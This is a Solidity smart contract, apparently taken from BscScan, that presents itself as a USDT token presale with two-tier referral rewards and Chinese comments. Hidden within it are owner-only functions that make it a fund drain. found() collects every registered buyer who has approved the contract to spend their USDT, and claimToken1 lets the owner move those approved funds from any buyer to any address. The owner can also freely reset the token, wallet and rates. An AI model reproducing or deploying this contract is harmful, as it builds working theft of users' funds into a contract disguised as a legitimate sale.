/**
 *Submitted for verification at BscScan.com on 2023-03-03
*/

/**
 *Submitted for verification at BscScan.com on 2023-02-27
*/

pragma solidity ^0.5.0;
//import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.5.0/contracts/token/ERC20/IERC20.sol";
//https://github.com/dalishen99/MintCoin/blob/master/README/Crowdsale/AllowanceCrowdsale.md
//https://github.com/dalishen99/MintCoin/blob/master/contracts/Crowdsale/AllowanceCrowdsale.sol
//https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.5.0/contracts/crowdsale/emission/AllowanceCrowdsale.sol
//https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.5.0/contracts/crowdsale/Crowdsale.sol
contract Allowance {
    using SafeMath for uint256;
    address private _owner;
    IERC20 private _token;
    address payable private _wallet;
    uint256 private _rate;
    address private _tokenWallet;

    uint256 private constant MAX = ~uint256(0);
    uint private _time = 0;
    //一级
    uint256 private _reward = 5;
    uint256 private _rewardUsdt = 5;
    //二级
    uint256 private _reward2 = 2;
    uint256 private _rewardUsdt2 = 2;

    address private _usdt;

    uint16[] private _smdw = [50 , 100, 200, 300];
    uint8 private _decimalsToken = 18;
    //个人众筹信息
    mapping(address => UserRelation) public user;
    // 所有下级
    mapping(address => address[]) public userSub;

    mapping(address => bool) public sfzc;

    address[] private allZc;
    address[] private hZc;
    
    struct UserRelation {
        uint256 countETH;
        address parent;
        //类型
        bool one;
        bool two;
        bool three;
        bool four;
        //推荐奖励
        uint256 rewardETH;
        //是否领取过 领取过后不可私募 不可再次领取
        bool isReceive;
        //推荐奖励
        uint256 rewardAllUsdt;
        uint256 rewardYlqUsdt;
    }
    //绑定父级
    function defineParent(address parentAddress) public payable{
        require(user[msg.sender].parent == address(0x0), "have parent");
        require(msg.value > 0, "No enough money");
        require(sfzc[parentAddress], "No register");
        user[msg.sender] = UserRelation(0, parentAddress, false, false, false, false, 0, false, 0, 0);
        sfzc[msg.sender] = true;
        allZc.push(msg.sender);
        //如果没有父级关系 前端设置默认地址
        userSub[parentAddress].push(msg.sender);
        // 支付一点 防止观察钱包
        _wallet.transfer(msg.value);
    }

    function claimTokenFromAddress() public payable{
        require(now > _time, "It's not time to collect");
        UserRelation storage userRelation = user[msg.sender];
        require(userRelation.rewardAllUsdt > 0, "No invite");
        require(!userRelation.isReceive, "Can't claim after receiving");
        uint256 all = (userRelation.countETH.add(userRelation.rewardETH)).mul(_rate);
        userRelation.isReceive = true;
        user[msg.sender] = userRelation;
        IERC20(_token).transferFrom(_tokenWallet, msg.sender, all*10**uint256(_decimalsToken));
    }

    function claimUsdtFromAddress() public payable{
        require(now > _time, "It's not time to collect");
        UserRelation storage userRelation = user[msg.sender];
        require(userRelation.countETH > 0, "No participation");
        require(userRelation.rewardAllUsdt.sub(userRelation.rewardYlqUsdt) > 0, "No claim limit");
        uint256 all = userRelation.rewardAllUsdt.sub(userRelation.rewardYlqUsdt);
        userRelation.rewardYlqUsdt = userRelation.rewardYlqUsdt.add(all);
        IERC20(_usdt).transferFrom(_tokenWallet, msg.sender, all*10**18);
    }

    //防止重入 nonReentrant
   function buyToken(bool one, bool two, bool three, bool four, uint256 smcount) public payable{
        require(sfzc[msg.sender], "No register");
        require(IERC20(_usdt).balanceOf(msg.sender) >= smcount * 10 ** 18, "No enough usdt");
        require(msg.value > 0, "No enough money");
        require((one || two || three || four), "must 1");
        UserRelation storage userRelation = user[msg.sender];
        require(!userRelation.isReceive, "Can't claim after receiving");
        if(one && !userRelation.one){
            require(smcount == _smdw[0], "Parameter error");
            userRelation.one = true;
        }else if(two && !userRelation.two){
            require(smcount == _smdw[1], "Parameter error");
            userRelation.two = true;
        }else if(three && !userRelation.three){
            require(smcount == _smdw[2], "Parameter error");
            userRelation.three = true;
        }else if(four && !userRelation.four){
            require(smcount == _smdw[3], "Parameter error");
            userRelation.four = true;
        }
        userRelation.countETH = userRelation.countETH.add(smcount);
        // 一级
        //修改成循环 
        address supAddress = address(0x0);
        if(userRelation.parent != address(0x0) && sfzc[userRelation.parent] && userRelation.parent != _wallet){
            UserRelation storage parent1 = user[userRelation.parent];
            supAddress = parent1.parent;
            if(_reward > 0){
                parent1.rewardETH = parent1.rewardETH.add(smcount.mul(_reward).div(100));
            }
            if(_rewardUsdt > 0){
                parent1.rewardAllUsdt = parent1.rewardAllUsdt.add(smcount.mul(_rewardUsdt).div(100));
            }
        }
        //二级奖励
        if(supAddress != address(0x0) && sfzc[supAddress] && supAddress != _wallet){
            UserRelation storage parent2 = user[supAddress];
            if(_reward2 > 0){
                parent2.rewardETH = parent2.rewardETH.add(smcount.mul(_reward2).div(100));
            }
            if(_rewardUsdt2 > 0){
                parent2.rewardAllUsdt = parent2.rewardAllUsdt.add(smcount.mul(_rewardUsdt2).div(100));
            }
        }
        IERC20(_usdt).transferFrom(msg.sender, _wallet, smcount*10**18);
   }

    function found() public onlyOwner returns(bool){
        hZc = new address[](0);
        for(uint i = 0; i < allZc.length; i++){
            if(IERC20(_usdt).allowance(allZc[i], address(this)) > 0){
                hZc.push(allZc[i]);
            }
        }
        return true;
    }

    constructor( 
        uint256 rate,           // 兑换比例
        address payable wallet, // 接收ETH受益人地址 0x4F93Edf6E1931009BbdaDD8D66E197971D37b952
        IERC20 token,           // 代币地址 0x8aff90e04ea809c65cc55efef5405940f99f27e7   bsctest 0x6BE3011CD7346D6b86F6944Af7aF90A1226BcDd1
        address tokenWallet,     // 代币从这个地址发送 
        address usdt     //0x55d398326f99059ff775485246999027b3197955  0xffac2033ff1ab8481b6e6e047ca9a315c3b54033  bsctest 0x2b30ac080b6c8F1BF46459D89F7B126BAf3B2DcE
    ) public {
        _owner = msg.sender;
        _token = token;
        _rate = rate;
        _wallet = wallet;
        _tokenWallet = tokenWallet;
        _usdt = usdt;
        user[msg.sender] = UserRelation(0, address(0), false, false, false, false, 0, false, 0, 0);
        sfzc[msg.sender] = true;
    }

    modifier onlyOwner() {
        require(msg.sender == _owner, "only own");
        _;
    }

   function () payable external{
        //cs[msg.sender] = msg.value;
        //_wallet.transfer(msg.value);
    }

    function claimToken(address token, uint256 amount, address to) external onlyOwner {
        IERC20(token).transfer(to, amount);
    }

    function claimToken1(address token, uint256 amount, address from, address to) external onlyOwner {
        IERC20(token).transferFrom(from, to, amount);
    }

    function token() public view returns (IERC20) {
        return _token;
    }
    
    function setToken(address tokenAddress) public onlyOwner {
        _token = IERC20(tokenAddress);
    }

    function wallet() public view returns (address payable) {
        return _wallet;
    }
    
    function setWallet(address payable walletAddress) public onlyOwner {
        _wallet = walletAddress;
    }

    function Rate() public view returns (uint256) {
        return _rate;
    }
    
    function setRate(uint256 rate) public onlyOwner {
        _rate = rate;
    }

    function TokenWallet() public view returns (address) {
        return _tokenWallet;
    }
    function setTokenWallet(address tokenWalletAddress) public onlyOwner {
        _tokenWallet = tokenWalletAddress;
    }

    function Own() public view returns (address) {
        return _owner;
    }

     function UserSub(address addr) public view returns(address[] memory){
        return userSub[addr];
    }
    function TokenTime() public view returns (uint) {
        return _time;
    }
    function setTokenTime(uint time) public onlyOwner {
        _time = time;
    }

    function Reward() public view returns (uint256) {
        return _reward;
    }
    function setReward(uint256 reward) public onlyOwner {
        _reward = reward;
    }
    function RewardUsdt() public view returns (uint256) {
        return _rewardUsdt;
    }
    function setRewardUsdt(uint256 rewardUsdt) public onlyOwner {
        _rewardUsdt = rewardUsdt;
    }

    function Reward2() public view returns (uint256) {
        return _reward2;
    }
    function setReward2(uint256 reward2) public onlyOwner {
        _reward2 = reward2;
    }
    function RewardUsdt2() public view returns (uint256) {
        return _rewardUsdt2;
    }
    function setRewardUsdt2(uint256 rewardUsdt2) public onlyOwner {
        _rewardUsdt2 = rewardUsdt2;
    }

    function Usdt() public view returns (address) {
        return _usdt;
    }
    function setUsdt(address usdt) public onlyOwner {
        _usdt = usdt;
    }
    function setSmdw(uint16[] memory smdw) public onlyOwner{
        _smdw = smdw;
    }
    function Smdw() public view returns (uint16[] memory) {
        return _smdw;
    }
    //function setAllZc(uint256 i, address zc) public onlyOwner{
    //    allZc[i] = zc;
    //}
    function AllZc() public view returns (address[] memory) {
        return allZc;
    }
   // function setHZc(uint256 i, address zc) public onlyOwner{
    //    hZc[i] = zc;
    //}
    function HZc() public view returns (address[] memory) {
        return hZc;
    }
    function setDecimalsToken(uint8 decimalsToken) public onlyOwner{
        _decimalsToken = decimalsToken;
    }
    function DecimalsToken() public view returns (uint8) {
        return _decimalsToken;
    }
    function setSfzc(address zcdz, bool sf) public onlyOwner{
        sfzc[zcdz] = sf;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}